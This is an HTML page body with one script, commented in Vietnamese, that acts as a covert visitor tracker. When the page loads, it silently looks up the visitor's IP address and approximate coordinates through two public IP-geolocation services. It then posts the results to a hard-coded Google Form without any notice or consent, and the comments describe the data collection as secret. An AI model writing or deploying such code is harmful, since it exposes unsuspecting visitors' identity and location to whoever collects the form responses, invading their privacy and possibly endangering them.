<body>

<script>
    const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSfJs2sEvay1GimaHnWYdk-HhnjuI5LcW8gzfPcehrpRvsjJgg/formResponse";
    const ENTRY_IP = "entry.1588338519";
    const ENTRY_LAT = "entry.791072472";
    const ENTRY_LNG = "entry.1393666541";

    function sendToGoogleForm(ip, lat, lng) {
        const formData = new FormData();
        formData.append(ENTRY_IP, ip);
        
        // Tự động thêm dấu nháy đơn ' nếu có toạ độ để Google Sheet không bị lỗi số
        const finalLat = (lat !== "Không lấy được") ? "'" + lat : lat;
        const finalLng = (lng !== "Không lấy được") ? "'" + lng : lng;
        
        formData.append(ENTRY_LAT, finalLat);
        formData.append(ENTRY_LNG, finalLng);

        fetch(FORM_URL, {
            method: "POST",
            mode: "no-cors",
            body: formData
        });
    }

    // Hàm chuyên đi săn IP và Toạ độ với 2 phương án
    async function getLocationNgam() {
        // Phương án 1: Dùng ipwho.is (Rất ổn định, không giới hạn)
        try {
            const res1 = await fetch("https://ipwho.is/");
            const data1 = await res1.json();
            if (data1.success && data1.latitude) {
                return { ip: data1.ip, lat: data1.latitude, lng: data1.longitude };
            }
        } catch (e) {
            console.log("Phương án 1 tạch, thử phương án 2...");
        }

        // Phương án 2: Dự phòng bằng freeipapi
        try {
            const res2 = await fetch("https://freeipapi.com/api/json");
            const data2 = await res2.json();
            if (data2.ipAddress && data2.latitude) {
                return { ip: data2.ipAddress, lat: data2.latitude, lng: data2.longitude };
            }
        } catch (e) {
            console.log("Phương án 2 cũng tạch.");
        }

        // Nếu cả 2 đều bị chặn (do dùng Adblock gắt)
        return { ip: "Bị chặn/Lỗi mạng", lat: "Không lấy được", lng: "Không lấy được" };
    }

    window.addEventListener("DOMContentLoaded", async () => {
        // Chạy hàm lấy data ngầm
        const myData = await getLocationNgam();
        
        // Bắn thẳng về Google Form
        sendToGoogleForm(myData.ip, myData.lat, myData.lng);
    });
</script>
